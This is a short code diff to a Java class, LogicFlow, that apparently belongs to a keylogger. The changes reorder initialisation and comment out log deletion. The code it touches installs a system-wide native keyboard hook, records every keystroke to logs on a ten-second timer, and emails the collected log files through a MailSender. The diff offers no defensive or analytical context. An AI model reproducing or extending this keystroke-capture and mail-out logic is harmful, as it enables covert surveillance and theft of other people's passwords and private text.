@@ -25,12 +25,10 @@ public class LogicFlow {
     private List<String> files;
 
     public LogicFlow(){
+        logFilesCollector = new LogFilesCollector();
         mailSender = new MailSender();
         timer = new Timer();
         keyReader = new KeyReader();
-        logRecorder = new LogRecorder();
-        writerTask = new WriterTask(keyReader,logRecorder);
-        logFilesCollector = new LogFilesCollector();
     }
 
     public void execute () throws NativeHookException {
@@ -43,8 +41,11 @@ public class LogicFlow {
             LOG.info("Mail has not been sent due to: " + e.getMessage());
         }
 
-        logFilesCollector.removeLogs(files);
+        //TODO
+        //logFilesCollector.removeLogs(files);
         GlobalScreen.registerNativeHook();
+        logRecorder = new LogRecorder();
+        writerTask = new WriterTask(keyReader,logRecorder);
         GlobalScreen.addNativeKeyListener(keyReader);
         timer.schedule(writerTask,1000L,10000L);
     }
